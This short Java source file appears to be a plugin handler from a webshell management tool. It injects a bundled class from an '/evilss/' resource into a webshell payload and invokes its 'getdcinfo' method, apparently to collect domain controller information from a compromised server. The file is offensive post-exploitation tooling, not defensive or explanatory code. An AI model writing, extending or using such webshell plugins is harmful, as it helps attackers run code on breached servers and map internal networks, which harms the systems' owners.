package shells.plugins.java.handler;

import util.functions;
import util.http.ReqParameter;

public class DCInfoHandler extends HandlerBase{
    public String handler() {
        this.payload.include("DCInfo", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/DCInfo.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("aaa", "aaa");
        return encoding.Decoding(payload.evalFunc("DCInfo", "getdcinfo", reqParameter));
    }
}
